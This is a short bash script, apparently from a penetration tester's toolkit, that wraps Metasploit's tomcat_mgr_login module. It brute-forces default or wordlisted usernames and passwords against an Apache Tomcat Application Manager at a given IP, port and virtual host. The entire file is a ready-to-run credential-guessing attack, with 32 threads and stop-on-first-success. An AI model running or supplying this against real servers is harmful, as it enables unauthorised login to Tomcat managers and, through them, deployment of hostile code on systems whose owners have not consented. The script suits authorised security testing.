#!/bin/bash

ShowUsage() {
	echo "Usage: $0 --target=<ip> [--port=<port>] [--ssl] [--vhost=<name>] [--user=<specific user> [--passwordfile=<passfile>]]"
	echo ""
	echo "$0 will attempt default username and password combinations against an Apache Tomcat Application Manager interface."
	echo ""
	echo "Note: The manager is at http://<ip>:8080/manager/html/ by default but may also be on port 80 or 443.  This should be manually checked first."
	echo ""
	echo "If <user> is provided the specific user account can be tested with the specified password file.  If a password file is not provided, /opt/wordlists/Mikeslist.short.sorted.txt will be assumed."
	echo ""
}

if [ $# -eq 0 ]; then
	ShowUsage
	exit 1
fi

USESSL="false"
SSLPARM=""
TARGET=""
# Note that the default path is http://<ip>:8080/manager/html/, however this can be changed to 80.  Check both.
PORT=8080
VHOST=""
USERID=""
PASSFILE=""

for i in $*
do
	case $i in
    	--target=*)
		TARGET=`echo $i | sed 's/[-a-zA-Z0-9]*=//' | grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"`
		;;
    	--port=*)
		PORT=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
    	--vhost=*)
		VHOST=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
	--ssl)
		USESSL="true"
		SSLPARM="SSL=true"
	;;
    	--user=*)
		USERID=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
    	--passwordfile=*)
		PASSFILE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
		;;
    	*)
                # unknown option
		echo "Unknown option: $i"
  		ShowUsage
		exit 3
		;;
  	esac
done

if [ ${#TARGET} -eq 0 ]; then
	echo "ERROR: Please specify a target."
	exit 2
fi

if [ ${#USERID} -gt 0 ]; then
	if [ ${#PASSFILE} -eq 0 ]; then
		echo "WARNING: No password file specified.  Using /opt/wordlists/Mikeslist.short.sorted.txt"
		PASSFILE="/opt/wordlists/Mikeslist.short.sorted.txt"
	fi
fi

PORTPARM=`echo "set RPORT $PORT"`
VHOSTPARM=""

if [ ${#VHOST} -gt 0 ]; then
	VHOSTPARM=`echo "set VHOST $VHOST"`
fi

THREADS=32
USERPARM=""
PASSFILEPARM=""

if [ ${#USERID} -gt 0 ]; then
	USERPARM=`echo "set USERNAME $USERID"`
	PASSFILEPARM=`echo "set PASS_FILE $PASSFILE"`	
fi

echo "Running with the following parameters:"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "SSL: $USESSL"
echo "VHOST: $VHOST"
if [ ${#USERID} -gt 0 ]; then
	echo "User: $USERID"
	echo "Password File: $PASSFILE"
fi

cd /opt/metasploit
msfconsole -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS $TARGET; $PORTPARM; $VHOSTPARM $SSLPARM; set STOPONSUCCESS true; $USERPARM; $PASSFILEPARM; set VERBOSE true; exploit; exit"

